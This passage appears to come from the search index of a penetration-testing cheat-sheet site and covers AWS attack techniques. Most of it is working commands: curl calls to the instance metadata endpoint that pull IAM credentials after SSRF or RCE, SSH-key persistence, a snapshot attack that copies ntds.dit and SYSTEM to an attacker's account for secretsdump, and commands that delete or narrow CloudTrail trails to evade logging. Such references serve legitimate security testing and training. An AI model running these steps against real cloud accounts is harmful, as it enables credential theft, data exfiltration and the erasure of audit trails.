instanceID\n</code></pre> <p>This command gathers the metadata from the instance, like commands or secrets. The output is base64 encoded</p>"},{"location":"cloud/aws/AWS%20Pentest/#listing-roles-of-an-instance","title":"Listing roles of an instance","text":"<pre><code>aws ec2 describe-iam-instance-profile-associations\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#exploitation_1","title":"Exploitation","text":"<ul> <li>Initial access can happen by RCE or SSRF</li> <li>Metadata can be used to exfiltrate information from the instance</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#remote-code-execution","title":"Remote code execution","text":""},{"location":"cloud/aws/AWS%20Pentest/#aws-metadata","title":"AWS Metadata","text":"<p>If we have remote code execution or SSRF, we can grab metadata information</p> <pre><code>curl http://169.254.169.254/latest/meta-data\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#grabbing-the-keys-to-access-the-instance","title":"Grabbing the keys to access the instance","text":"<pre><code>curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#grabbing-the-keys-in-metadata-version-2","title":"Grabbing the keys in metadata version 2","text":"<pre><code>TOKEN=`curl\nX PUT \"http://169.254.169.254/latest/ api /token\" H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\"`\n&amp;&amp; curl H \"X-aws-ec2-metadata-token: $TOKEN\" v http://169.254.169.254/latest/meta-data/\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#aws-userdata","title":"AWS Userdata","text":"<p>Version 1</p> <pre><code>curl http://169.254.169.254/latest/user-data/\n</code></pre> <p>Version 2</p> <pre><code>TOKEN=`curl\nX PUT \"http://169.254.169.254/latest/ api /token\" H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\"`\n&amp;&amp; curl H \"X-aws-ec2-metadata-token: $TOKEN\" v http://169.254.169.254/latest/user-data/\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#privilege-escalation_2","title":"Privilege Escalation","text":"<ul> <li>One approach to get a shell in an instance is to put a reverse shell in UserData attribute, when the  instance is launched, we will have the connection.</li> <li>Another approach happens when we have the iam:PassRole and iam:AmazonEC2FullAccess permissions, we can add an administrator role to the compromised EC2 instance and access aws services.</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#getting-information-about-the-key","title":"Getting information about the key","text":"<pre><code>aws sts get-caller-identity\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#getting-policies-attached-to-the-iam-user","title":"Getting policies attached to the IAM user","text":"<pre><code>aws iam list-attached-user-policies --user-name user_name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#getting-information-about-a-specific-policy-version","title":"Getting information about a specific policy version","text":"<pre><code>aws iam get-policy-version --policy-arn ARN --version-id ID\n</code></pre> <p>To attach a role to an EC2 instance, we can use the RCE to grab the ID</p> <pre><code>curl http://169.254.169.254/latest/meta-data/instance-id\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-instance-profiles","title":"Listing instance profiles","text":"<pre><code>aws iam list-instance-profiles\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#attach-an-instance-profile-to-an-ec2-instance","title":"Attach an instance profile to an EC2 instance","text":"<pre><code>aws ec2 associate-iam-instance-profile --instance-id ID --iam-instance-profile Name=ProfileName\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#credential-access_1","title":"Credential Access","text":"<ul> <li>We can grab the credentials by abusing metadata (Web Application with SSRF,RCE and so on)</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#after-the-initial-access","title":"After the initial access","text":"<ol> <li>Enumerate the key (Role)</li> </ol> <pre><code>aws sts get-caller-identity\n</code></pre> <ol> <li>If there are roles associated with the key, we can grab the credentials by issuing a request to the metadata endpoint (v1 or v2)</li> </ol> <pre><code>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_OF_PREVIOUS_COMMAND\n</code></pre> <ol> <li>Configure the aws cli</li> </ol> <pre><code>aws configure \n</code></pre> <p>Or use environment variables.</p>"},{"location":"cloud/aws/AWS%20Pentest/#persistence_2","title":"Persistence","text":"<ul> <li>All the persistence techniques works here, SSH persistence, vim backdoor and so on.</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#ssh-persistence-example","title":"SSH Persistence example","text":"<ol> <li>Generate SSH Key pair</li> </ol> <pre><code>ssh-keygen\n</code></pre> <ol> <li>Add public key to authorized_keys</li> </ol> <pre><code>echo \"PUBLIC_Key\" &gt;&gt; /home/user/.ssh/authorized_keys\n</code></pre> <ol> <li>Use the private key to connect </li> </ol> <pre><code>ssh -i public_key user@instance\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#elastic-block-store","title":"Elastic Block Store","text":"<ul> <li>Block storage system used to store persistent data</li> <li>It's possible to attach this drive to EC2 and increase the storage (Like and HD, but scalable).</li> <li>It's possible to create a snapshot (It will be saved on S3) and create a volume from this snapshot.</li> <li>It's possible to attach the snapshot (Backup of BS) to an EC2 instance</li> <li>Snapshots can be used as volumes or AMI's</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#enumeration_5","title":"Enumeration","text":""},{"location":"cloud/aws/AWS%20Pentest/#enumerating-ebs-volumes","title":"Enumerating EBS volumes","text":"<pre><code>aws ec2 describe-volumes\n</code></pre> <ul> <li>If the volume is available, it can be attached to an EC2 instance</li> <li>Check if the EBS is encrypted</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#enumerating-snapshots","title":"Enumerating Snapshots","text":"<pre><code>aws ec2 describe-snapshots --owner-ids self \n</code></pre> <ul> <li>Also check if the snapshot is encrypted</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#exploitation-data-exfiltration","title":"Exploitation &amp; Data Exfiltration","text":"<ul> <li>Create a snapshot of an EC2 instance, create a volume from snapshot and attach to other EC2 instance. </li> <li>User need to have IAM permissions on EC2</li> <li>Maybe we don't have the right to access the instance but have rights to create a snapshot and attach it to another machine.</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#creating-a-snapshot-of-a-specified-volume","title":"Creating a snapshot of a specified volume","text":"<pre><code>aws ec2 create-snapshot --volume volumeID --description \"Example\" --profile profile_name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-snapshots","title":"Listing snapshots","text":"<pre><code>aws ec2 describe-snapshots\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#creating-a-volume-from-a-snasphot","title":"Creating a volume from a snasphot","text":"<pre><code>aws ec2 create-volume --snapshot-id ID --availability-zone ZONE --profile profile_name\n</code></pre> <ul> <li>The volume needs to be in the same availability zone as the instance we have access</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#attaching-the-volume-to-an-instance","title":"Attaching the volume to an instance","text":"<pre><code>aws ec2 attach-volume --volume-id VolumeID --instance-id InstanceID --device /dev/sdfd -&gt; Can be other value\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#mounting-the-volume","title":"Mounting the volume","text":"<pre><code>sudo mount /dev/sdfd /directory\n</code></pre> <p>After mounting, we will have access to the disk. </p>"},{"location":"cloud/aws/AWS%20Pentest/#rds-relational-database-service","title":"RDS - Relational Database Service","text":"<ul> <li>Service to use, operate and scale relational databases in AWS (MariaDB, MySQL and similar)</li> <li>The access is done by using password, password+IAM or password+kerberos</li> <li>It's possible to restrict access using restrictions such as specific EC2 or lambda or use network-level restrictions such as vpc, ip.</li> <li>RDS Proxy hadles the traffic between the application and the database, it enables the enforcing of IAM permissions and use secrets manager to store credentials.</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#enumeration_6","title":"Enumeration","text":""},{"location":"cloud/aws/AWS%20Pentest/#listing-information-about-clusters-in-rds","title":"Listing information about clusters in RDS","text":"<pre><code>aws rds describe-db-clusters\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-information-about-rds-instances","title":"Listing information about RDS instances","text":"<pre><code>aws rds describe-db-instances\n</code></pre> <ul> <li>IAMDatabaseAuthenticationEnabled: false -&gt; Need password to access the instance</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#listing-information-about-subnet-groups-in-rds","title":"Listing information about subnet groups in RDS","text":"<pre><code>aws rds describe-db-subnet-groups\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-information-about-database-security-groups-in-rds","title":"Listing information about database security groups in RDS","text":"<pre><code>aws rds describe-db-security-groups\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-information-about-database-proxies","title":"Listing information about database proxies","text":"<pre><code>aws rds describe-db-proxies\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#data-exfiltration_1","title":"Data exfiltration","text":"<ul> <li>If the instance is in a security group or VPC, we need to compromise it first to access the database (For example, we compromise an EC2 instance in the same VPC, then its possible to connect)</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#list-instances-in-rds","title":"List instances in RDS","text":"<pre><code>aws rds describe-db-instances\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#list-information-about-the-specified-security-group","title":"List information about the specified security group","text":"<pre><code>aws ec2 describe-security-groups --group-ids id\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#password-based-authentication","title":"Password-based authentication","text":"<pre><code>mysql -h hostname -u name -P port -p password\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#iam-based-authentication","title":"IAM Based authentication","text":"<p>1. Identify the user</p> <pre><code>aws sts get-caller-identity\n</code></pre> <p>2. List all policies attached to a role</p> <pre><code>aws iam list-attached-role-policies --role-name name\n</code></pre> <p>3. Get information about a specific version of a policy</p> <pre><code>aws iam get-policy-version --policy-arn arn --version-id ID\n</code></pre> <p>4. Get a temporary token from the RDS</p> <pre><code>aws rds generate-db-auth-token --hostname hostname --port port --username username --region region\n</code></pre> <ul> <li>To be easier, we can put it in a variable</li> </ul> <pre><code>TOKEN=$(aws rds generate-db-auth-token --hostname hostname --port port --username username --region region)\n</code></pre> <p>5. Connect to the DB using the token</p> <pre><code>mysql -h hostname -u name -P port --enable-cleartext-plugin --user=user --password=$TOKEN\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#sso-other-services","title":"SSO &amp; Other Services","text":""},{"location":"cloud/aws/AWS%20Pentest/#single-sign-on-sso","title":"Single Sign On (SSO)","text":"<ul> <li>Used to manage access to multiple AWS accounts and applications centrally. </li> <li>Provide users a way to interact with all services and applications through one place</li> <li>Can be used to manage access and user permissions to all AWS accounts</li> <li>The identity source can use AWS SSO's identity store or external identity store (Okta, SAML and similar)</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#cloudtrail","title":"CloudTrail","text":"<ul> <li>Log monitoring service, allows us to continuously monitor and retain account activity related to actions in our AWS account </li> <li>Provide event history of AWS account activity, SDKs, command line tools and other services</li> <li>Commonly used to detect unusual behavior in AWS account</li> <li>Pacu automatically changes the user agent to deceive the logs of cloudtrail</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#userful-commands","title":"Userful Commands","text":""},{"location":"cloud/aws/AWS%20Pentest/#list-trails","title":"List trails","text":"<pre><code>aws cloudtrail list-trails\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#disabling-cloudtrail","title":"Disabling CloudTrail","text":"<pre><code>aws cloudtrail delete-trail --name example_trail --profile name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#disable-monitoring-of-events-from-global-events","title":"Disable monitoring of events from global events","text":"<pre><code>aws cloudtrail update-trail --name example_trail --no-include-global-service-event\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#disable-cloudtrail-on-specific-regions","title":"Disable CloudTrail on specific regions","text":"<pre><code>aws cloudtrail update-trail --name example_trail --no-include-global-service-event --no-is-multi-region --region=eu-west\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#aws-shield","title":"AWS Shield","text":"<ul> <li>Used to protect services from Denial of Service Attacks</li> <li>There are 2 versions, the standard and the Advanced</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#aws-waf","title":"AWS Waf","text":"<ul> <li>Used to protect applications against common web application attacks </li> <li>Common WAF bypasses can be tested against it</li> <li>To detect a WAF, we can use <code>wafw00f</code></li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#aws-inspector","title":"AWS Inspector","text":"<ul> <li>Automated security assessment service that helps improve the security and compliance of applications on AWS</li> <li>Works with an agent </li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#aws-guard-duty","title":"AWS Guard Duty","text":"<ul> <li>Threat detection service that monitors for malicious activity and unauthorized behavior</li> <li>Works by collecting and analyzing logs</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#virtual-private-cloud","title":"Virtual Private Cloud","text":"<ul> <li>Used to create an isolated infrastructure within the cloud, including subnets and so on.</li> <li>If the VPC has an internet gateway, means it is a public subnet</li> <li>Every VPC can have Network ACL's</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#routing-tables","title":"Routing Tables","text":"<p>A set of rules to determine where the traffic will be directed, comes in the form of Destination and Target, defined as follows</p> <pre><code>DESTINATION TARGET\n\nIP          local -&gt; VPC Internal\nIP          igw   -&gt; Internet Gateway\nIP          nat   -&gt; NAT Gateway\nIP          pcx   -&gt; VPC Peering\nIP          vpce  -&gt; VPC Endpoint\nIP          vgw   -&gt; VPN Gateway\nIP          eni   -&gt; Network Interface\n</code></pre> <ul> <li>VPC Internal -&gt; Internal IP, no internet connection</li> <li>Internet Gateway -&gt; Used to access the internet</li> <li>NAT Gateway -&gt; Does the NAT between machines, allows one-way connection to the internet</li> <li>VPC Peering -&gt; Allows the communication between 2 VPC's</li> <li>VPC Endpoint -&gt; Used to access aws services without internet connection (Internet Gateway)</li> <li>VPN Gateway -&gt; Used to expand the cloud to on premises and vice-versa</li> <li>Network Interface -&gt; Network Interfaces</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#enumeration_7","title":"Enumeration","text":""},{"location":"cloud/aws/AWS%20Pentest/#listing-vpcs","title":"Listing VPC's","text":"<pre><code>aws ec2 describe-vpcs\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-vpcs-specifying-the-region","title":"Listing VPC's specifying the region","text":"<pre><code>aws ec2 describe-vpcs --region us-west-1\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-vpc-information-by-id","title":"Listing VPC information by ID","text":"<pre><code>aws ec2 describe-vpcs --filters \"Name=vpc-id,Values=ID\"\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-subnets","title":"Listing subnets","text":"<pre><code>aws ec2 describe-subnets\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-subnets-by-vpc-id","title":"Listing subnets by VPC-id","text":"<pre><code>aws ec2 describe-subnets --filters \"Name=vpc-id,Values=ID\"\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-routing-tables","title":"Listing routing tables","text":"<pre><code>aws ec2 describe-route-tables\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-routing-tables-by-vpc-id","title":"Listing routing tables by VPC-id","text":"<pre><code>aws ec2 describe-route-tables --filters \"Name=vpc-id,Values=ID\"\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-network-acls","title":"Listing Network ACL's","text":"<pre><code>aws ec2 describe-network-acls\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#lateral-movement-and-pivoting","title":"Lateral Movement and Pivoting","text":"<ul> <li>We can abuse VPC peering to do lateral movement</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#scenario","title":"Scenario","text":"<ul> <li>There are 3 VPC's -&gt; A,B,C </li> <li>A can access B through peering and B access C. We can use VPC B as a peering pivot to access VPC C from VPC A.</li> <li>The lateral movement can be done if we gather keys or other machines </li> <li>Always enumerate the subnets to see in which subnet we can access other VPC's</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#listing-vpc-peering-connections","title":"Listing VPC peering connections","text":"<pre><code>aws ec2 describe-vpc-peering-connections\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-subnets-of-specific-vpc-important-because-the-access-can-be-restricted-to-specific-subnets-to-other-vpcs","title":"Listing subnets of specific VPC (Important because the access can be restricted to specific subnets to other VPC's)","text":"<pre><code>aws ec2 describe-subnets --filters \"Name=vpc-id,Values=ID\"\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-routing-tables_1","title":"Listing routing tables","text":"<pre><code>aws ec2 describe-route-tables --filters \"Name=vpc-id,Values=ID\"\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-instances-on-the-specified-vpc-id","title":"Listing instances on the specified VPC ID","text":"<pre><code>aws ec2 describe-instances --filters \"Name=vpc-id,Values=ID\"\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-instances-on-the-specified-subnet","title":"Listing instances on the specified subnet","text":"<pre><code>aws ec2 describe-instances --filters \"Name=subnet-id,Values=ID\"\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#references","title":"References","text":"<ul> <li>My arsenal of AWS Security tools - toniblyx</li> <li>AWS Privilege Escalation method mitigation - RhinoSecurityLabs</li> </ul>"},{"location":"cloud/aws/aws-access-token/","title":"AWS - Access Token &amp; Secrets","text":""},{"location":"cloud/aws/aws-access-token/#url-services","title":"URL Services","text":"Service URL s3 https://{user_provided}.s3.amazonaws.com cloudfront https://{random_id}.cloudfront.net ec2 ec2-{ip-seperated}.compute-1.amazonaws.com es https://{user_provided}-{random_id}.{region}.es.amazonaws.com elb http://{user_provided}-{random_id}.{region}.elb.amazonaws.com:80/443 elbv2 https://{user_provided}-{random_id}.{region}.elb.amazonaws.com rds mysql://{user_provided}.{random_id}.{region}.rds.amazonaws.com:3306 rds postgres://{user_provided}.{random_id}.{region}.rds.amazonaws.com:5432 route 53 {user_provided} execute-api https://{random_id}.execute-api.{region}.amazonaws.com/{user_provided} cloudsearch https://doc-{user_provided}-{random_id}.{region}.cloudsearch.amazonaws.com transfer sftp://s-{random_id}.server.transfer.{region}.amazonaws.com iot mqtt://{random_id}.iot.{region}.amazonaws.com:8883 iot https://{random_id}.iot.{region}.amazonaws.com:8443 iot https://{random_id}.iot.{region}.amazonaws.com:443 mq https://b-{random_id}-{1,2}.mq.{region}.amazonaws.com:8162 mq ssl://b-{random_id}-{1,2}.mq.{region}.amazonaws.com:61617 kafka b-{1,2,3,4}.{user_provided}.{random_id}.c{1,2}.kafka.{region}.amazonaws.com kafka {user_provided}.{random_id}.c{1,2}.kafka.useast-1.amazonaws.com cloud9 https://{random_id}.vfs.cloud9.{region}.amazonaws.com mediastore https://{random_id}.data.mediastore.{region}.amazonaws.com kinesisvideo https://{random_id}.kinesisvideo.{region}.amazonaws.com mediaconvert https://{random_id}.mediaconvert.{region}.amazonaws.com mediapackage https://{random_id}.mediapackage.{region}.amazonaws.com/in/v1/{random_id}/channel"},{"location":"cloud/aws/aws-access-token/#access-key-id-secret","title":"Access Key ID &amp; Secret","text":"<p>IAM uses the following prefixes to indicate what type of resource each unique ID applies to. The first four characters are the prefix that depends on the type of the key.</p> Prefix Resource type ABIA AWS STS service bearer token ACCA Context-specific credential AGPA User group AIDA IAM user AIPA Amazon EC2 instance profile AKIA Access key ANPA Managed policy ANVA Version in a managed policy APKA Public key AROA Role ASCA Certificate ASIA Temporary (AWS STS) access key <p>The rest of the string is Base32 encoded and can be used to recover the account id.</p> <pre><code>import base64\nimport binascii\n\ndef AWSAccount_from_AWSKeyID(AWSKeyID):\n\n    trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix\n    x = base64.b32decode(trimmed_AWSKeyID) #base32 decode\n    y = x[0:6]\n\n    z = int.from_bytes(y, byteorder='big', signed=False)\n    mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)\n\n    e = (z &amp; mask)&gt;&gt;7\n    return (e)\n\n\nprint (\"account id:\" + \"{:012d}\".format(AWSAccount_from_AWSKeyID(\"ASIAQNZGKIQY56JQ7WML\")))\n</code></pre>"},{"location":"cloud/aws/aws-access-token/#regions","title":"Regions","text":"<ul> <li>US Standard - http://s3.amazonaws.com</li> <li>Ireland - http://s3-eu-west-1.amazonaws.com</li> <li>Northern California - http://s3-us-west-1.amazonaws.com</li> <li>Singapore - http://s3-ap-southeast-1.amazonaws.com</li> <li>Tokyo - http://s3-ap-northeast-1.amazonaws.com</li> </ul>"},{"location":"cloud/aws/aws-access-token/#gaining-aws-console-access-via-api-keys","title":"Gaining AWS Console Access via API Keys","text":"<p>A utility to convert your AWS CLI credentials into AWS console access.</p> <ul> <li>Using NetSPI/aws_consoler <pre><code>$&gt; aws_consoler -v -a AKIA[REDACTED] -s [REDACTED]\n2020-03-13 19:44:57,800 [aws_consoler.cli] INFO: Validating arguments...\n2020-03-13 19:44:57,801 [aws_consoler.cli] INFO: Calling logic.\n2020-03-13 19:44:57,820 [aws_consoler.logic] INFO: Boto3 session established.\n2020-03-13 19:44:58,193 [aws_consoler.logic] WARNING: Creds still permanent, creating federated session.\n2020-03-13 19:44:58,698 [aws_consoler.logic] INFO: New federated session established.\n2020-03-13 19:44:59,153 [aws_consoler.logic] INFO: Session valid, attempting to federate as arn:aws:sts::123456789012:federated-user/aws_consoler.\n2020-03-13 19:44:59,668 [aws_consoler.logic] INFO: URL generated!\nhttps://signin.aws.amazon.com/federation?Action=login&amp;Issuer=consoler.local&amp;Destination=https%3A%2F%2Fconsole.aws.amazon.com%2Fconsole%2Fhome%3Fregion%3Dus-east-1&amp;SigninToken=[REDACTED]\n</code></pre></li> </ul>"},{"location":"cloud/aws/aws-access-token/#references","title":"References","text":"<ul> <li>A short note on AWS KEY ID - Tal Be'ery - Oct 27, 2023</li> <li>Gaining AWS Console Access via API Keys - Ian Williams - March 18th, 2020</li> </ul>"},{"location":"cloud/aws/aws-cognito/","title":"AWS - Service - Cognito","text":"<ul> <li>Cognito Scanner - A CLI tool for executing attacks on cognito such as Unwanted account creation, Account Oracle and Identity Pool escalation.     <pre><code># Installation\n$ pip install cognito-scanner\n# Usage\n$ cognito-scanner --help\n# Get information about how to use the unwanted account creation script\n$ cognito-scanner account-creation --help\n# For more details go to https://github.com/padok-team/cognito-scanner\n</code></pre></li> </ul>"},{"location":"cloud/aws/aws-cognito/#references","title":"References","text":""},{"location":"cloud/aws/aws-dynamodb/","title":"AWS - Service - DynamoDB","text":"<p>Amazon DynamoDB is a key-value and document database that delivers single-digit millisecond performance at any scale. It's a fully managed, multi-region, multi-active, durable database with built-in security, backup and restore, and in-memory caching for internet-scale applications. DynamoDB can handle more than 10 trillion requests per day and can support peaks of more than 20 million requests per second.</p>"},{"location":"cloud/aws/aws-dynamodb/#list-tables","title":"List Tables","text":"<pre><code>$ aws --endpoint-url http://s3.bucket.htb dynamodb list-tables        \n\n{\n    \"TableNames\": [\n        \"users\"\n    ]\n}\n</code></pre>"},{"location":"cloud/aws/aws-dynamodb/#enumerate-table-content","title":"Enumerate Table Content","text":"<pre><code>$ aws --endpoint-url http://s3.bucket.htb dynamodb scan --table-name users | jq -r '.Items[]'\n\n{\n  \"password\": {\n    \"S\": \"Management@#1@#\"\n  },\n  \"username\": {\n    \"S\": \"Mgmt\"\n  }\n}\n</code></pre>"},{"location":"cloud/aws/aws-dynamodb/#references","title":"References","text":""},{"location":"cloud/aws/aws-ec2/","title":"AWS - Service - EC2","text":"<ul> <li>dufflebag - Find secrets that are accidentally exposed via Amazon EBS's \"public\" mode</li> </ul>"},{"location":"cloud/aws/aws-ec2/#copy-ec2-using-ami-image","title":"Copy EC2 using AMI Image","text":"<p>First you need to extract data about the current instances and their AMI/security groups/subnet : <code>aws ec2 describe-images --region eu-west-1</code></p> <pre><code># create a new image for the instance-id\n$ aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name \"AWS Audit\" --description \"Export AMI\" --region eu-west-1  \n\n# add key to AWS\n$ aws ec2 import-key-pair --key-name \"AWS Audit\" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1  \n\n# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.\n$ aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids \"sg-6d0d7f01\" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name \"AWS Audit\" --query \"Instances[0].InstanceId\" --region eu-west-1\n\n# now you can check the instance \naws ec2 describe-instances --instance-ids i-0546910a0c18725a1 \n\n# If needed : edit groups\naws ec2 modify-instance-attribute --instance-id \"i-0546910a0c18725a1\" --groups \"sg-6d0d7f01\"  --region eu-west-1\n\n# be a good guy, clean our instance to avoid any useless cost\naws ec2 stop-instances --instance-id \"i-0546910a0c18725a1\" --region eu-west-1 \naws ec2 terminate-instances --instance-id \"i-0546910a0c18725a1\" --region eu-west-1\n</code></pre>"},{"location":"cloud/aws/aws-ec2/#mount-ebs-volume-to-ec2-linux","title":"Mount EBS volume to EC2 Linux","text":"<p> EBS snapshots are block-level incremental, which means that every snapshot only copies the blocks (or areas) in the volume that had been changed since the last snapshot. To restore your data, you need to create a new EBS volume from one of your EBS snapshots. The new volume will be a duplicate of the initial EBS volume on which the snapshot was taken.</p> <ol> <li>Head over to EC2 \u2013&gt; Volumes and create a new volume of your preferred size and type.</li> <li>Select the created volume, right click and select the \"attach volume\" option.</li> <li>Select the instance from the instance text box as shown below : <code>attach ebs volume</code> <pre><code>aws ec2 create-volume \u2013snapshot-id snapshot_id --availability-zone zone\naws ec2 attach-volume \u2013-volume-id volume_id \u2013-instance-id instance_id --device device\n</code></pre></li> <li>Now, login to your ec2 instance and list the available disks using the following command : <code>lsblk</code></li> <li>Check if the volume has any data using the following command : <code>sudo file -s /dev/xvdf</code></li> <li>Format the volume to ext4 filesystem  using the following command : <code>sudo mkfs -t ext4 /dev/xvdf</code></li> <li>Create a directory of your choice to mount our new ext4 volume. I am using the name \u201cnewvolume\u201d : <code>sudo mkdir /newvolume</code></li> <li>Mount the volume to \"newvolume\" directory using the following command : <code>sudo mount /dev/xvdf /newvolume/</code></li> <li>cd into newvolume directory and check the disk space for confirming the volume mount : <code>cd /newvolume; df -h .</code></li> </ol>"},{"location":"cloud/aws/aws-ec2/#shadow-copy-attack","title":"Shadow Copy attack","text":"<p>Requirements:</p> <ul> <li>EC2:CreateSnapshot</li> <li>Static-Flow/CloudCopy</li> </ul> <p>Exploit:</p> <ol> <li>Load AWS CLI with Victim Credentials that have at least CreateSnapshot permissions</li> <li>Run <code>\"Describe-Instances\"</code> and show in list for attacker to select</li> <li>Run <code>\"Create-Snapshot\"</code> on volume of selected instance</li> <li>Run <code>\"modify-snapshot-attribute\"</code> on new snapshot to set <code>\"createVolumePermission\"</code> to attacker AWS Account</li> <li>Load AWS CLI with Attacker Credentials</li> <li>Run <code>\"run-instance\"</code> command to create new linux ec2 with our stolen snapshot</li> <li>Ssh run <code>\"sudo mkdir /windows\"</code></li> <li>Ssh run <code>\"sudo mount /dev/xvdf1 /windows/\"</code></li> <li>Ssh run <code>\"sudo cp /windows/Windows/NTDS/ntds.dit /home/ec2-user\"</code></li> <li>Ssh run <code>\"sudo cp /windows/Windows/System32/config/SYSTEM /home/ec2-user\"</code></li> <li>Ssh run <code>\"sudo chown ec2-user:ec2-user /home/ec2-user/*\"</code></li> <li>SFTP get <code>\"/home/ec2-user/SYSTEM ./SYSTEM\"</code></li> <li>SFTP get <code>\"/home/ec2-user/ntds.dit ./ntds.dit\"</code></li> <li>locally run <code>\"secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local -outputfile secrets'</code>, expects secretsdump to be on path</li> </ol>"},{"location":"cloud/aws/aws-ec2/#instance-connect","title":"Instance Connect","text":"<p>Push an SSH key to EC2 instance</p> <pre><code># https://aws.amazon.com/fr/blogs/compute/new-using-amazon-ec2-instance-connect-for-ssh-access-to-your-ec2-instances/\n$ aws ec2 describe-instances --profile uploadcreds --region eu-west-1 | jq \".[][].Instances | .[] | {InstanceId, KeyName, State}\"\n$ aws ec2-instance-connect send-ssh-public-key --region us-east-1 --instance-id INSTANCE --availability-zone us-east-1d --instance-os-user ubuntu --ssh-public-key file://shortkey.pub --profile uploadcreds\n</code></pre>"},{"location":"cloud/aws/aws-ec2/#references","title":"References","text":"<ul> <li>How to Attach and Mount an EBS volume to EC2 Linux Instance - AUGUST 17, 2016</li> </ul>"},{"location":"cloud/aws/aws-enumeration/","title":"AWS - Enumerate","text":""},{"location":"cloud/aws/aws-enumeration/#collectors","title":"Collectors","text":"<ul> <li> <p>nccgroup/ScoutSuite - Multi-Cloud Security Auditing Tool     <pre><code>$ python scout.py PROVIDER --help\n# The --session-token is optional and only used for temporary credentials (i.e. role assumption).\n$ python scout.py aws --access-keys --access-key-id &lt;AKIAIOSFODNN7EXAMPLE&gt; --secret-access-key &lt;wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY&gt; --session-token &lt;token&gt;\n$ python scout.py azure --cli\n</code></pre></p> </li> <li> <p>RhinoSecurityLabs/pacu - Exploit configuration flaws within an AWS environment using an extensible collection of modules with a diverse feature-set     <pre><code>$ bash install.sh\n$ python3 pacu.py\nset_keys/swap_keys\nrun &lt;module_name&gt; [--keyword-arguments]\nrun &lt;module_name&gt; --regions eu-west-1,us-west-1\n</code></pre></p> </li> <li> <p>salesforce/cloudsplaining - An AWS IAM Security Assessment tool that identifies violations of least privilege and generates a risk-prioritized report     <pre><code>$ pip3 install --user cloudsplaining\n$ cloudsplaining download --profile myawsprofile\n$ cloudsplaining scan --input-file default.json\n</code></pre></p> </li> <li> <p>duo-labs/cloudmapper - CloudMapper helps you analyze your Amazon Web Services (AWS) environments     <pre><code>sudo apt-get install autoconf automake libtool python3.7-dev python3-tk jq awscli build-essential\npipenv install --skip-lock\npipenv 